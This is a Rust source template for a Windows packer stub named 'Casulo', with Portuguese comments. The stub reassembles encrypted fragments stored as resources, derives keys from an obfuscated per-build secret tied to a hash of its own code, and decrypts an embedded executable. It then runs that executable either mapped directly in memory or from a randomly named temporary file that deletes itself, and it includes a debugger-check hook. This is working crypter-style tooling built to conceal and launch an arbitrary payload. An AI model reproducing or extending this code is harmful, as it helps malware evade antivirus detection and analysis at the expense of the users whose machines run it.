#![windows_subsystem = "@@WINDOWS_SUBSYSTEM@@"]

mod loader;
mod exec_vm;
mod paging;
mod exec_signal;

 
use std::env;
use std::ffi::OsStr;
use std::fs::{remove_file, File};
use std::io::{Read, Seek, SeekFrom};
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::process::{exit, Command};

use aes::Aes256;
use cbc::cipher::{block_padding::NoPadding, BlockModeDecrypt, KeyIvInit};
use cbc::Decryptor;
use hkdf::Hkdf;
use hmac::{Hmac, KeyInit, Mac};
use sha2::Digest as _;
use sha2::Sha256;

type HmacSha256 = Hmac<Sha256>;
type Aes256CbcDec = Decryptor<Aes256>;

// Material diversificado por build. SECRET_ENC recebe o valor final após a compilação.
static SECRET_ENC: [u8; 32] = [@@SECRET_ENC@@];
static SECRET_MASK: [u8; 32] = [@@SECRET_MASK@@];

static SEED_SALT: [u64; 4] = [@@SEED_SALT@@];

// Quando habilitado, a derivação também depende do SHA-256 da seção .text.
const MASK_FROM_TEXT: bool = @@MASK_FROM_TEXT@@;
const MAGIC_COUNT: usize = @@MAGIC_COUNT@@;
const MAGICS: [u64; @@MAGIC_COUNT@@] = [@@MAGIC_ARRAY@@];
const FRAG_FOOTER_MAGIC: u64 = 0x@@FOOTER_MAGIC@@;

const EXEC_VM_DOMAIN: [u8; 16] = [@@EXEC_VM_DOMAIN@@];


const FRAG_LABEL: [u8; 16] = [@@FRAG_LABEL@@];
const META_LABEL: [u8; 16] = [@@META_LABEL@@];

// O packer decide entre o mapper interno e o fallback convencional em disco.
const EXEC_IN_MEMORY: bool = @@EXEC_IN_MEMORY@@;

// Só é usado no modo memória; paging.rs cuida das páginas executáveis.
const DEMAND_PAGING: bool = @@DEMAND_PAGING@@;

const FRAG_FORMAT_VERSION: u32 = 4;
const FRAG_CHUNK_VERSION: u8 = 1;
const BUILD_ID_SIZE: usize = 16;
const SALT_SIZE: usize = 32;
const IV_SIZE: usize = 16;
const KEY_SIZE: usize = 32;
const TAG_SIZE: usize = 32;
const CHUNK_HEADER_SIZE: usize = 88;
const DIR_ENTRY_SIZE: usize = 16;
const FOOTER_SIZE: usize = 40;
const TRAILER_SIZE: usize = 32;
const MAX_PAYLOAD_SIZE: u64 = 512 * 1024 * 1024;

#[link(name = "bcrypt")]
unsafe extern "system" {
    fn BCryptGenRandom(
        algorithm: *mut core::ffi::c_void,
        buffer: *mut u8,
        buffer_len: u32,
        flags: u32,
    ) -> i32;
}

const BCRYPT_USE_SYSTEM_PREFERRED_RNG: u32 = 0x00000002;

// O manifest RCDATA descreve a ordem dos fragmentos físicos do PackedRegion.
const CASULO_MANIFEST_RCDATA_ID: u16 = @@MANIFEST_RCDATA_ID@@;
const RT_RCDATA_ID: u16 = 10;
const RCDATA_MANIFEST_MAGIC: [u8; 8] = FRAG_FOOTER_MAGIC.to_le_bytes();
const RCDATA_MANIFEST_VERSION: u32 = 1;
const RCDATA_MANIFEST_HEADER_SIZE: usize = 56;
const RCDATA_MANIFEST_ENTRY_SIZE: usize = 16;
const MAX_RCDATA_FRAGMENTS: usize = 4096;
const MAX_PACKED_RESOURCE_SIZE: u64 = MAX_PAYLOAD_SIZE + 64 * 1024 * 1024;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn GetModuleHandleW(name: *const u16) -> *mut core::ffi::c_void;
    fn FindResourceW(
        module: *mut core::ffi::c_void,
        name: *const u16,
        kind: *const u16,
    ) -> *mut core::ffi::c_void;
    fn LoadResource(
        module: *mut core::ffi::c_void,
        resource: *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    fn SizeofResource(
        module: *mut core::ffi::c_void,
        resource: *mut core::ffi::c_void,
    ) -> u32;
    fn LockResource(resource_data: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
}

#[inline]
fn make_int_resource(id: u16) -> *const u16 {
    id as usize as *const u16
}

// Os recursos pertencem à imagem mapeada do próprio stub e permanecem válidos até o fim do processo.
fn load_rcdata(id: u16) -> Option<&'static [u8]> {
    unsafe {
        let module = GetModuleHandleW(core::ptr::null());
        if module.is_null() {
            return None;
        }

        let resource = FindResourceW(
            module,
            make_int_resource(id),
            make_int_resource(RT_RCDATA_ID),
        );
        if resource.is_null() {
            return None;
        }

        let size = SizeofResource(module, resource) as usize;
        if size == 0 {
            return None;
        }

        let loaded = LoadResource(module, resource);
        if loaded.is_null() {
            return None;
        }

        let ptr = LockResource(loaded) as *const u8;
        if ptr.is_null() {
            return None;
        }

        Some(core::slice::from_raw_parts(ptr, size))
    }
}

// Remonta os fragmentos e valida o SHA-256 antes de entregar o buffer ao parser v4.
fn load_packed_region_from_resources() -> Option<Vec<u8>> {
    let manifest = load_rcdata(CASULO_MANIFEST_RCDATA_ID)?;

    if manifest.len() < RCDATA_MANIFEST_HEADER_SIZE {
        return None;
    }
    if manifest.get(0..8)? != RCDATA_MANIFEST_MAGIC.as_slice() {
        return None;
    }
    if get_u32(manifest, 8)? != RCDATA_MANIFEST_VERSION {
        return None;
    }

    let count = get_u32(manifest, 12)? as usize;
    let total_size = get_u64(manifest, 16)?;

    if count == 0
        || count > MAX_RCDATA_FRAGMENTS
        || total_size == 0
        || total_size > MAX_PACKED_RESOURCE_SIZE
        || total_size > usize::MAX as u64
    {
        return None;
    }

    let entries_size = count.checked_mul(RCDATA_MANIFEST_ENTRY_SIZE)?;
    let expected_manifest_size = RCDATA_MANIFEST_HEADER_SIZE.checked_add(entries_size)?;
    if manifest.len() != expected_manifest_size {
        return None;
    }

    let expected_hash = manifest.get(24..56)?;
    let mut packed = Vec::with_capacity(total_size as usize);
    let mut ids = Vec::<u16>::with_capacity(count);
    let mut sum = 0u64;

    for i in 0..count {
        let e = RCDATA_MANIFEST_HEADER_SIZE
            .checked_add(i.checked_mul(RCDATA_MANIFEST_ENTRY_SIZE)?)?;

        if get_u32(manifest, e)? != i as u32 {
            return None;
        }

        let id = get_u16(manifest, e + 4)?;
        let reserved = get_u16(manifest, e + 6)?;
        let fragment_size = get_u64(manifest, e + 8)?;

        if id == 0
            || id == CASULO_MANIFEST_RCDATA_ID
            || reserved != 0
            || fragment_size == 0
            || fragment_size > usize::MAX as u64
            || ids.iter().any(|&seen| seen == id)
        {
            return None;
        }

        sum = sum.checked_add(fragment_size)?;
        if sum > total_size {
            return None;
        }

        let fragment = load_rcdata(id)?;
        if fragment.len() != fragment_size as usize {
            return None;
        }

        packed.extend_from_slice(fragment);
        ids.push(id);
    }

    if sum != total_size || packed.len() != total_size as usize {
        return None;
    }

    let digest = Sha256::digest(&packed);
    if &digest[..] != expected_hash {
        return None;
    }

    Some(packed)
}

// Pequena tolerância para alinhamento introduzido pelo resource compiler.
const MAX_RESOURCE_PADDING: usize = 16;

// Confirma magic, versão e packed_size para localizar o fim lógico da região.
fn find_region_end(resource: &[u8]) -> Option<usize> {
    let min = FOOTER_SIZE + TRAILER_SIZE;
    if resource.len() < min {
        return None;
    }

    let max_pad = MAX_RESOURCE_PADDING.min(resource.len() - min);

    for pad in 0..=max_pad {
        let end = resource.len() - pad;
        let footer_pos = end - TRAILER_SIZE - FOOTER_SIZE;

        if get_u64(resource, footer_pos) == Some(FRAG_FOOTER_MAGIC)
            && get_u32(resource, footer_pos + 8) == Some(FRAG_FORMAT_VERSION)
            && get_u64(resource, footer_pos + 24) == Some(end as u64)
        {
            return Some(end);
        }
    }

    None
}

#[inline(never)]
// A VM faz a limpeza e mantém um fallback volatile internamente.
fn secure_zero(data: &mut [u8]) {
    let _ = exec_vm::vm_secure_zero(data);
}


fn debugger_present() -> bool {
    false
}

fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key");
    mac.update(data);
    let out = mac.finalize().into_bytes();
    let mut r = [0u8; 32];
    r.copy_from_slice(&out);
    r
}

fn hmac_verify_parts(key: &[u8], parts: &[&[u8]], tag: &[u8]) -> bool {
    let mut mac = match HmacSha256::new_from_slice(key) {
        Ok(v) => v,
        Err(_) => return false,
    };
    for p in parts {
        mac.update(p);
    }
    mac.verify_slice(tag).is_ok()
}

fn hkdf_sha256(ikm: &[u8], salt: &[u8], info: &[u8], okm: &mut [u8]) -> bool {
    let hk = Hkdf::<Sha256>::new(Some(salt), ikm);
    hk.expand(info, okm).is_ok()
}

fn derive_meta_key(secret: &[u8]) -> [u8; 32] {
    hmac_sha256(secret, &META_LABEL)
}

// Token transitório usado apenas pelo gate final da VM.
fn derive_exec_vm_token(secret: &[u8; 32]) -> u64 {
    let mut input = [0u8; 24];
    input[..16].copy_from_slice(&EXEC_VM_DOMAIN);
    input[16..24].copy_from_slice(&FRAG_FOOTER_MAGIC.to_le_bytes());

    let mut tag = hmac_sha256(secret, &input);
    let token = u64::from_le_bytes([
        tag[0], tag[1], tag[2], tag[3],
        tag[4], tag[5], tag[6], tag[7],
    ]);

    secure_zero(&mut tag);
    secure_zero(&mut input);

    token
}


// O hash usa os bytes da .text no arquivo, não a imagem já relocada em memória.
fn self_text_hash(out: &mut [u8; 32]) -> bool {
    const HEADER_BYTES: usize = 4096;
    const SECTION_ENTRY: usize = 40;

    let path = match env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let mut file = match File::open(&path) {
        Ok(f) => f,
        Err(_) => return false,
    };

    let mut head = [0u8; HEADER_BYTES];
    let mut filled = 0usize;
    while filled < HEADER_BYTES {
        match file.read(&mut head[filled..]) {
            Ok(0) => break,
            Ok(n) => filled += n,
            Err(_) => return false,
        }
    }
    let head = &head[..filled];

    if get_u16(head, 0) != Some(0x5A4D) {
        return false;
    }

    let pe = match get_u32(head, 0x3C) {
        Some(v) => v as usize,
        None => return false,
    };
    if get_u32(head, pe) != Some(0x0000_4550) {
        return false;
    }

    let sections = match get_u16(head, pe + 6) {
        Some(v) => v as usize,
        None => return false,
    };
    let opt_size = match get_u16(head, pe + 20) {
        Some(v) => v as usize,
        None => return false,
    };

    let table = match pe.checked_add(24).and_then(|v| v.checked_add(opt_size)) {
        Some(v) => v,
        None => return false,
    };

    let mut text_off = 0u32;
    let mut text_size = 0u32;

    for i in 0..sections {
        let entry = match i.checked_mul(SECTION_ENTRY).and_then(|v| v.checked_add(table)) {
            Some(v) => v,
            None => return false,
        };
        let name = match head.get(entry..entry + 8) {
            Some(v) => v,
            None => return false,
        };
        if name == b".text\0\0\0" {
            text_size = match get_u32(head, entry + 16) {
                Some(v) => v,
                None => return false,
            };
            text_off = match get_u32(head, entry + 20) {
                Some(v) => v,
                None => return false,
            };
            break;
        }
    }

    if text_off == 0 || text_size == 0 {
        return false;
    }

    if file.seek(SeekFrom::Start(text_off as u64)).is_err() {
        return false;
    }

    let mut hasher = Sha256::new();
    let mut buffer = [0u8; 64 * 1024];
    let mut left = text_size as usize;

    while left > 0 {
        let want = if left < buffer.len() { left } else { buffer.len() };
        match file.read(&mut buffer[..want]) {
            Ok(0) => return false,
            Ok(n) => {
                hasher.update(&buffer[..n]);
                left -= n;
            }
            Err(_) => return false,
        }
    }

    out.copy_from_slice(&hasher.finalize());
    true
}

// Combina o salt do build com o hash da .text quando o binding está ativo.
fn build_vm_seed(seed: &mut [u8; 32]) -> bool {
    for (i, word) in SEED_SALT.iter().enumerate() {
        seed[i * 8..i * 8 + 8].copy_from_slice(&word.to_le_bytes());
    }

    if MASK_FROM_TEXT {
        let mut digest = [0u8; 32];
        if !self_text_hash(&mut digest) {
            secure_zero(seed);
            return false;
        }
        for i in 0..32 {
            seed[i] ^= digest[i];
        }
        secure_zero(&mut digest);
    }

    true
}

fn make_chunk_info(build_id: &[u8], magic: u64, index: u32) -> [u8; 44] {
    let mut info = [0u8; 44];
    info[0..16].copy_from_slice(&FRAG_LABEL);
    info[16..32].copy_from_slice(build_id);
    info[32..40].copy_from_slice(&magic.to_le_bytes());
    info[40..44].copy_from_slice(&index.to_le_bytes());
    info
}

fn pkcs7_unpad_len(data: &[u8]) -> Option<usize> {
    let n = data.len();
    if n == 0 || n % IV_SIZE != 0 {
        return None;
    }
    let pad = data[n - 1] as usize;
    if pad == 0 || pad > IV_SIZE || pad > n {
        return None;
    }
    let mut diff = 0u8;
    let mut j = 1usize;
    while j <= IV_SIZE {
        if j <= pad {
            diff |= data[n - j] ^ (pad as u8);
        }
        j += 1;
    }
    if diff != 0 {
        return None;
    }
    let unp = n - pad;
    if unp == 0 { None } else { Some(unp) }
}

fn decrypt_chunk_in_place(key: &[u8], iv: &[u8], data: &mut [u8]) -> Option<usize> {
    if data.is_empty() || data.len() % IV_SIZE != 0 {
        return None;
    }
    let dec = Aes256CbcDec::new_from_slices(key, iv).ok()?;
    let n = dec.decrypt_padded::<NoPadding>(data).ok()?.len();
    let unp = pkcs7_unpad_len(&data[..n])?;
    Some(unp)
}


// O packer injeta apenas a implementação do algoritmo selecionado.
@@DECOMPRESSOR_IMPL@@

#[inline]
fn get_u16(b: &[u8], o: usize) -> Option<u16> {
    let s = b.get(o..o.checked_add(2)?)?;
    Some(u16::from_le_bytes([s[0], s[1]]))
}

#[inline]
fn get_u32(b: &[u8], o: usize) -> Option<u32> {
    let s = b.get(o..o.checked_add(4)?)?;
    Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

#[inline]
fn get_u64(b: &[u8], o: usize) -> Option<u64> {
    let s = b.get(o..o.checked_add(8)?)?;
    Some(u64::from_le_bytes([
        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
    ]))
}

fn is_pe64_amd64(d: &[u8]) -> bool {
    if d.len() < 0x100 || get_u16(d, 0) != Some(0x5A4D) {
        return false;
    }
    let pe = match get_u32(d, 0x3C) {
        Some(v) => v as usize,
        None => return false,
    };
    let end = match pe.checked_add(26) {
        Some(v) => v,
        None => return false,
    };
    if end > d.len() {
        return false;
    }
    if get_u32(d, pe) != Some(0x0000_4550) {
        return false;
    }
    if get_u16(d, pe + 4) != Some(0x8664) {
        return false;
    }
    let opt = pe + 24;
    if get_u16(d, opt) != Some(0x020B) {
        return false;
    }
    let subsystem = match get_u16(d, opt + 68) {
        Some(v) => v,
        None => return false,
    };
    subsystem == 2 || subsystem == 3
}

fn slice_at(data: &[u8], off: u64, len: usize) -> Option<&[u8]> {
    let start = usize::try_from(off).ok()?;
    let end = start.checked_add(len)?;
    data.get(start..end)
}


// A partir daqui o parser trabalha sobre o PackedRegion v4 já remontado.
fn extract_payload(secret: &mut [u8; 32]) -> Result<Vec<u8>, ()> {
    if debugger_present() {
        return Err(());
    }

    let packed_storage = load_packed_region_from_resources().ok_or(())?;

    let region_len = find_region_end(&packed_storage).ok_or(())?;
    let packed = &packed_storage[..region_len];

    let footer_pos = region_len - TRAILER_SIZE - FOOTER_SIZE;
    let footer = packed.get(footer_pos..footer_pos + FOOTER_SIZE).ok_or(())?;
    let trailer = packed.get(footer_pos + FOOTER_SIZE..).ok_or(())?;

    let n = get_u32(footer, 12).ok_or(())? as usize;
    if n == 0 || n != MAGIC_COUNT {
        return Err(());
    }

    let dir_size = get_u64(footer, 16).ok_or(())?;
    let final_size = get_u64(footer, 32).ok_or(())?;

    let expected_dir = (n as u64).checked_mul(DIR_ENTRY_SIZE as u64).ok_or(())?;
    let metadata_size = dir_size
        .checked_add(FOOTER_SIZE as u64)
        .and_then(|v| v.checked_add(TRAILER_SIZE as u64))
        .ok_or(())?;

    if dir_size != expected_dir
        || metadata_size > region_len as u64
        || final_size == 0
        || final_size > MAX_PAYLOAD_SIZE
    {
        return Err(());
    }

    let chunk_region_size = region_len as u64 - metadata_size;
    let dir_pos = (footer_pos as u64).checked_sub(dir_size).ok_or(())?;
    let dir = slice_at(packed, dir_pos, dir_size as usize).ok_or(())?;

    let mut meta_key = derive_meta_key(secret);
    let meta_ok = hmac_verify_parts(&meta_key, &[dir, footer], trailer);
    secure_zero(&mut meta_key);
    if !meta_ok {
        return Err(());
    }

    let mut state = *secret;
    let mut compressed = Vec::<u8>::new();
    let mut expected_off = 0u64;

    for i in 0..n {
        let ent = i.checked_mul(DIR_ENTRY_SIZE).ok_or(())?;
        let ch_off = get_u64(dir, ent).ok_or(())?;
        let ch_size = get_u64(dir, ent + 8).ok_or(())?;
        let ch_end = ch_off.checked_add(ch_size).ok_or(())?;

        if ch_off != expected_off
            || ch_size < (CHUNK_HEADER_SIZE + TAG_SIZE + IV_SIZE) as u64
            || ch_end > chunk_region_size
        {
            secure_zero(&mut state);
            secure_zero(&mut compressed);
            return Err(());
        }
        expected_off = ch_end;

        // RCDATA é somente leitura; AES-CBC precisa de uma cópia mutável do chunk.
        let mut chunk = slice_at(packed, ch_off, ch_size as usize).ok_or(())?.to_vec();

        if chunk.first() != Some(&FRAG_CHUNK_VERSION)
            || chunk.get(1) != Some(&0)
            || chunk.get(2) != Some(&0)
            || chunk.get(3) != Some(&0)
            || get_u32(&chunk, 4) != Some(i as u32)
        {
            secure_zero(&mut state);
            secure_zero(&mut compressed);
            secure_zero(&mut chunk);
            return Err(());
        }

        let mut build_id = [0u8; BUILD_ID_SIZE];
        build_id.copy_from_slice(chunk.get(8..8 + BUILD_ID_SIZE).ok_or(())?);
        let mut salt = [0u8; SALT_SIZE];
        salt.copy_from_slice(
            chunk
                .get(8 + BUILD_ID_SIZE..8 + BUILD_ID_SIZE + SALT_SIZE)
                .ok_or(())?,
        );
        let mut iv = [0u8; IV_SIZE];
        iv.copy_from_slice(
            chunk
                .get(8 + BUILD_ID_SIZE + SALT_SIZE..8 + BUILD_ID_SIZE + SALT_SIZE + IV_SIZE)
                .ok_or(())?,
        );
        let cipher_len = get_u64(&chunk, 72).ok_or(())?;
        let plain_len = get_u64(&chunk, 80).ok_or(())?;

        let expected_chunk_size = (CHUNK_HEADER_SIZE as u64)
            .checked_add(cipher_len)
            .and_then(|v| v.checked_add(TAG_SIZE as u64))
            .ok_or(())?;

        if cipher_len == 0
            || cipher_len % IV_SIZE as u64 != 0
            || expected_chunk_size != ch_size
            || plain_len == 0
            || plain_len > cipher_len
            || cipher_len > usize::MAX as u64
        {
            secure_zero(&mut state);
            secure_zero(&mut compressed);
            secure_zero(&mut chunk);
            return Err(());
        }

        let cl = cipher_len as usize;
        let info = make_chunk_info(&build_id, MAGICS[i], i as u32);
        let mut okm = [0u8; KEY_SIZE * 2];
        if !hkdf_sha256(&state, &salt, &info, &mut okm) {
            secure_zero(&mut state);
            secure_zero(&mut compressed);
            secure_zero(&mut chunk);
            secure_zero(&mut okm);
            return Err(());
        }

        let tag_start = CHUNK_HEADER_SIZE.checked_add(cl).ok_or(())?;
        let tag_end = tag_start.checked_add(TAG_SIZE).ok_or(())?;
        let tag = chunk.get(tag_start..tag_end).ok_or(())?.to_vec();

        let tag_ok = {
            let header = chunk.get(0..CHUNK_HEADER_SIZE).ok_or(())?;
            let ct = chunk.get(CHUNK_HEADER_SIZE..tag_start).ok_or(())?;
            hmac_verify_parts(&okm[KEY_SIZE..], &[header, ct], &tag)
        };
        if !tag_ok {
            secure_zero(&mut state);
            secure_zero(&mut compressed);
            secure_zero(&mut chunk);
            secure_zero(&mut okm);
            return Err(());
        }

        let unp = {
            let ct = chunk.get_mut(CHUNK_HEADER_SIZE..tag_start).ok_or(())?;
            decrypt_chunk_in_place(&okm[..KEY_SIZE], &iv, ct).ok_or(())?
        };
        secure_zero(&mut okm);

        if unp as u64 != plain_len {
            secure_zero(&mut state);
            secure_zero(&mut compressed);
            secure_zero(&mut chunk);
            return Err(());
        }

        let plain = chunk
            .get(CHUNK_HEADER_SIZE..CHUNK_HEADER_SIZE + unp)
            .ok_or(())?;
        compressed.extend_from_slice(plain);
        state = hmac_sha256(&state, plain);
        secure_zero(&mut chunk);
    }

    if expected_off != chunk_region_size {
        secure_zero(&mut state);
        secure_zero(&mut compressed);
        return Err(());
    }
    secure_zero(&mut state);

    let mut payload = match decompress_payload(&compressed, final_size as usize) {
        Some(v) => v,
        None => {
            secure_zero(&mut compressed);
            return Err(());
        }
    };
    secure_zero(&mut compressed);

    if !is_pe64_amd64(&payload) {
        secure_zero(&mut payload);
        return Err(());
    }

    Ok(payload)
}


// Fallback em disco: arquivo temporário sem compartilhamento de escrita e com exclusão no fechamento.
const GENERIC_WRITE: u32 = 0x4000_0000;
const DELETE: u32 = 0x0001_0000;
const FILE_SHARE_READ: u32 = 0x0000_0001;
const FILE_SHARE_DELETE: u32 = 0x0000_0004;
const CREATE_NEW: u32 = 1;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_TEMPORARY: u32 = 0x0000_0100;
const FILE_FLAG_DELETE_ON_CLOSE: u32 = 0x0400_0000;
const ERROR_FILE_EXISTS: u32 = 80;

const INVALID_HANDLE: isize = -1;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn CreateFileW(
        name: *const u16,
        access: u32,
        share: u32,
        security: *mut core::ffi::c_void,
        disposition: u32,
        flags: u32,
        template: *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    fn WriteFile(
        file: *mut core::ffi::c_void,
        buffer: *const u8,
        len: u32,
        written: *mut u32,
        overlapped: *mut core::ffi::c_void,
    ) -> i32;
    fn CloseHandle(handle: *mut core::ffi::c_void) -> i32;
    fn GetLastError() -> u32;
}

fn wide(text: &OsStr) -> Vec<u16> {
    text.encode_wide().chain(core::iter::once(0)).collect()
}

#[allow(dead_code)]
// RAII para garantir fechamento do handle nos caminhos de erro.
struct OwnedHandle {
    raw: *mut core::ffi::c_void,
}

impl Drop for OwnedHandle {
    fn drop(&mut self) {
        if !self.raw.is_null() && self.raw as isize != INVALID_HANDLE {
            unsafe { CloseHandle(self.raw) };
            self.raw = core::ptr::null_mut();
        }
    }
}

#[allow(dead_code)]
fn random_runtime_name() -> Option<String> {
    let mut random = [0u8; 8];
    let status = unsafe {
        BCryptGenRandom(
            core::ptr::null_mut(),
            random.as_mut_ptr(),
            random.len() as u32,
            BCRYPT_USE_SYSTEM_PREFERRED_RNG,
        )
    };

    if status < 0 {
        secure_zero(&mut random);
        return None;
    }

    let mut name = String::with_capacity(16 + 4);
    for b in random {
        use core::fmt::Write as _;
        if write!(&mut name, "{b:02x}").is_err() {
            return None;
        }
    }
    name.push_str(".exe");
    Some(name)
}

#[allow(dead_code)]
// O handle de escrita é fechado antes do CreateProcess para não bloquear o image loader.
fn create_runtime_exe() -> Option<(PathBuf, Vec<u16>, OwnedHandle)> {
    let base = env::var_os("LOCALAPPDATA")
        .map(PathBuf::from)
        .or_else(|| {
            env::current_exe()
                .ok()
                .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        })?;

    for _ in 0..16 {
        let name = random_runtime_name()?;
        let path = base.join(name);
        let wide_path = wide(path.as_os_str());

        let handle = unsafe {
            CreateFileW(
                wide_path.as_ptr(),
                GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_DELETE,
                core::ptr::null_mut(),
                CREATE_NEW,
                FILE_ATTRIBUTE_TEMPORARY,
                core::ptr::null_mut(),
            )
        };

        if handle as isize == INVALID_HANDLE {
            if unsafe { GetLastError() } == ERROR_FILE_EXISTS {
                continue;
            }
            return None;
        }

        return Some((path, wide_path, OwnedHandle { raw: handle }));
    }

    None
}

#[allow(dead_code)]
// Mantém DELETE_ON_CLOSE ativo enquanto o processo filho estiver em execução.
fn open_delete_guard(wide_path: &[u16]) -> Option<OwnedHandle> {
    let handle = unsafe {
        CreateFileW(
            wide_path.as_ptr(),
            DELETE,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
            core::ptr::null_mut(),
        )
    };

    if handle as isize == INVALID_HANDLE {
        return None;
    }
    Some(OwnedHandle { raw: handle })
}

#[allow(dead_code)]
// Caminho de compatibilidade para payloads que não podem usar o mapper interno.
fn exec_from_disk(payload: &mut Vec<u8>) -> Result<i32, ()> {
    let (runtime_path, wide_path, writer) = create_runtime_exe().ok_or(())?;

    let mut written_total = 0usize;
    let mut write_ok = true;

    while written_total < payload.len() {
        let chunk = core::cmp::min(payload.len() - written_total, 1 << 20);
        let mut written = 0u32;
        let ok = unsafe {
            WriteFile(
                writer.raw,
                payload.as_ptr().add(written_total),
                chunk as u32,
                &mut written,
                core::ptr::null_mut(),
            )
        };
        if ok == 0 || written == 0 {
            write_ok = false;
            break;
        }
        written_total += written as usize;
    }


    secure_zero(payload);
    payload.clear();
    payload.shrink_to_fit();

    // O loader do Windows precisa abrir o arquivo sem um handle de escrita concorrente.
    drop(writer);

    if !write_ok {
        let _ = remove_file(&runtime_path);
        return Err(());
    }

    let mut guard = open_delete_guard(&wide_path);

    if debugger_present() {
        drop(guard);
        let _ = remove_file(&runtime_path);
        return Err(());
    }

    let args: Vec<std::ffi::OsString> = env::args_os().skip(1).collect();
    let mut status = Command::new(&runtime_path).args(&args).status();

    if status.is_err() && guard.is_some() {
        drop(guard.take());
        status = Command::new(&runtime_path).args(&args).status();
    }

    drop(guard);
    let _ = remove_file(&runtime_path);

    match status {
        Ok(s) => Ok(s.code().unwrap_or(1)),
        Err(_) => Err(()),
    }
}


// Deriva o segredo, autentica/extrai a payload e só então transfere o controle.
fn run() -> i32 {
    let mut seed = [0u8; 32];
    if !build_vm_seed(&mut seed) {
        return 1;
    }


    let mut mix = [0u8; 32];
    let mixed = exec_vm::derive_mix(&seed, &mut mix);
    secure_zero(&mut seed);
    if mixed.is_err() {
        secure_zero(&mut mix);
        return 1;
    }

    let mut secret = [0u8; 32];
    let decoded = exec_vm::decode_secret(&SECRET_ENC, &SECRET_MASK, &mix, &mut secret);
    secure_zero(&mut mix);
    if decoded.is_err() {
        secure_zero(&mut secret);
        return 1;
    }

    // Calculado enquanto o Secret ainda está disponível.
    let vm_token = derive_exec_vm_token(&secret);

    let extracted = extract_payload(&mut secret);
    secure_zero(&mut secret);

    let mut payload = match extracted {
        Ok(p) => p,
        Err(_) => return 1,
    };

    if EXEC_IN_MEMORY {
        // Relocations, imports, TLS, unwind e proteções permanecem responsabilidade do loader.
        let mapped = loader::map(&payload, DEMAND_PAGING);

        secure_zero(&mut payload);
        payload.clear();
        payload.shrink_to_fit();
        drop(payload);

        match mapped {
            Ok(m) => {
                exec_vm::execute(vm_token, move || unsafe { m.run() }).unwrap_or(1)
            }
            Err(_) => 1,
        }
    } else {
        let code = exec_vm::execute(vm_token, || {
            // O VEH apenas confirma a transição; escrita e CreateProcess continuam fora do handler.
            if !exec_signal::request_disk_execution() {
                return 1;
            }
            exec_from_disk(&mut payload).unwrap_or(1)
        });

        secure_zero(&mut payload);
        payload.clear();
        payload.shrink_to_fit();

        code.unwrap_or(1)
    }
}


// A transferência para a payload permanece na thread principal.
fn main() {


    exit(run());
}